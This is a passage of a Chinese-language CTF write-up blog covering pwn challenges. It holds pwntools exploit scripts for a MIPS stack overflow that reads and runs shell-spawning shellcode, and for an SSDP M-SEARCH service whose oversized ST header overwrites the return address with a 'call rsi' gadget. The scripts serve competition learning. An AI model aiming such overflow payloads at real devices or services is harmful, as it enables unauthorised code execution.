        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">mips</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#io = process(['qemu-mipsel', '-g', '1000', '-L', '.' ,'./challenge'])
#io = process(['qemu-mipsel', '-g', '1234', '-L', '.' ,'./pwn'])
#io = process(['qemu-mipsel-static','./challenge'])
#io = process(['qemu-mipsel','./challenge'])
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">node4.buuoj.cn</span><span class="sh">'</span><span class="p">,</span><span class="mi">26794</span><span class="p">)</span>


<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">your passphrase: </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">e4b889e58583e4b880e4b8b2e58d81e58583e4b889e4b8b2</span><span class="sh">'</span><span class="p">))</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Congratulation!</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>

<span class="c1">#pay = 0x44 * b'A' +p32(0x0043965C) + shellcode
</span>
<span class="c1"># 0x439670    lw     $a0, 0x3c($sp)
# 0x439674    sw     $v0, 0x1c($sp)
# 0x439678    sw     $zero, 0x18($sp)
# 0x43967c    sw     $zero, 0x10($sp)
# 0x439680    lw     $v0, 0x34($sp)
# ► 0x439684    jalr   $t9                           &lt;0x41414141&gt;
</span>
<span class="n">pay</span> <span class="o">=</span> <span class="nf">cyclic</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x00431084</span><span class="p">)</span> <span class="o">+</span><span class="nf">p32</span><span class="p">(</span><span class="mh">0x0043965C</span><span class="p">)</span> <span class="o">+</span> <span class="mi">88</span><span class="o">*</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">$a2</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x200</span><span class="p">))</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="nf">pause</span><span class="p">()</span>
<span class="c1"># 溢出数据有限 所以选择 二次 read shellcode
</span><span class="n">pay</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>
<span class="nf">sl</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="n">pay</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="mh">0x0043965C</span> <span class="n">用来调整寄存器数据</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Contorl Jump 是 执行完gadget 后的跳转， 我选择的gatget   最后的 是 <code class="language-plaintext highlighter-rouge">jalr $fp</code>​ ，<code class="language-plaintext highlighter-rouge">$fp</code>​ 有就是栈 是我们可控的</p>

<p>‍</p>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231129162735-0rg9o43.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231129162735-0rg9o43.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="mh">0x00431084</span> <span class="err">$</span><span class="n">fp</span> <span class="n">返回地址</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>调整后 <code class="language-plaintext highlighter-rouge">$a2</code>​ 指向的地址也就是 shellcode in stack 的 addr 直接跳过去</p>

<p>‍</p>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231129163100-00ehis8.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231129163100-00ehis8.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p><a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231129162424-hh3587z.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231129162424-hh3587z.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="pwn-fakessdp"><span class="me-2">Pwn-fakeSSDP</span><a href="#pwn-fakessdp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p>我是菜鸡，跟着wp做的</p>

<p>‍</p>

<p><a href="https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd">‍⁣﻿⁢﻿⁣⁤‬⁡‍‬⁢⁣⁤‌⁡⁢⁤‌⁡⁡﻿‍⁣⁣‬‬‌﻿⁣﻿‬‬⁢⁡‌‌‌‍DAS X 0psu3 - 飞书云文档 (feishu.cn)</a></p>

<p>‍</p>

<p>‍</p>

<p>还不知道 SSDP 是啥，我就抓个包看看</p>

<p>‍</p>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130105100-mai5ddg.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130105100-mai5ddg.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">M-SEARCH * HTTP/1.1</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">HOST: 239.255.255.250:1900</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MAN: </span><span class="sh">"</span><span class="s">ssdp:discover</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MX: 1</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">ST: urn:dial-multiscreen-org:service:dial:1</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">USER-AGENT: Microsoft Edge/119.0.2151.93 Windows</span><span class="se">\r\n</span><span class="sh">'</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130114000-3673a71.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130114000-3673a71.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>目测 system函数</li>
</ul>

<p>‍</p>

<p>​​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130114246-cqm0oix.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130114246-cqm0oix.png" alt="image" loading="lazy"></a>​​</p>

<p>‍</p>

<p>有 sandbox函数，导致貌似不能利用命令拼接</p>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130121434-ogxqr85.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130121434-ogxqr85.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130142216-c74kc83.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130142216-c74kc83.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130142205-qf76f48.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130142205-qf76f48.png" alt="image" loading="lazy"></a>​</p>

<p>​​</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="sh">'</span><span class="s">b *0x0403591</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Waiting for SSDP request</span><span class="sh">'</span><span class="p">)</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>

<span class="n">p</span> <span class="o">=</span> <span class="mi">300</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span>
<span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">M-SEARCH * HTTP/1.1</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">HOST: 239.255.255.250:1900</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MAN: </span><span class="sh">"</span><span class="s">ssdp:discover</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MX: 3</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">ST: ssdp:all </span><span class="sh">'</span><span class="o">+</span><span class="n">p</span><span class="o">+</span><span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span> <span class="o">//</span> <span class="n">主要处理点</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">USER-AGENT: Microsoft Edge/119.0.2151.93 Windows</span><span class="se">\r\n</span><span class="sh">'</span>


<span class="nf">sl</span><span class="p">(</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>

<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>There is a stack overflow vulnerability</p>

<p>​</p>

<p><a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130121711-ky18kug.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130121711-ky18kug.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>rsi in the value in our ST, overwrite return address as “call rsi”</p>

<p>‍</p>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130134631-5low8b9.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130134631-5low8b9.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./fakeSSDP</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">node4.buuoj.cn</span><span class="sh">'</span><span class="p">,</span><span class="mi">27898</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">text</span><span class="sh">'</span><span class="p">)</span>


<span class="c1">#gdb.attach(io,'b *0x0403591')
</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Waiting for SSDP request</span><span class="sh">'</span><span class="p">)</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>


<span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x000000000045fe1e</span> <span class="c1"># call rsi
</span>

<span class="n">p</span>  <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>
<span class="n">p</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">ssdp:all</span><span class="sh">'</span>
<span class="n">p</span>  <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xe8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span>
<span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">M-SEARCH * HTTP/1.1</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">HOST: 239.255.255.250:1900</span><span class="se">\r\n</span><span class="sh">'</span>
